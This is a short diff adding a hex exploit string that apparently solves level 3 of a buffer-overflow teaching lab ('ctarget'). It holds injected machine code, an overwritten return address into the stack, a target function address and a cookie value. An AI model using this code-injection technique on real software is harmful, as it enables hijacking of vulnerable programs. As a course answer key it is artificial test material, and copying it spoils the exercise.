@@ -1,0 +1,12 @@
+/* Inject ctarget.l3.o assembly instructions as hex codes into a 0x28-bits buffer */ 
+48 c7 c7 08 ab 66 55 c3
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+/* Ret address: subq 0x28 %rsp */
+d0 aa 66 55 00 00 00 00
+/* touch3 address */
+76 26 40 00 00 00 00 00
+/* Cookie */
+36 36 33 32 33 34 34 65
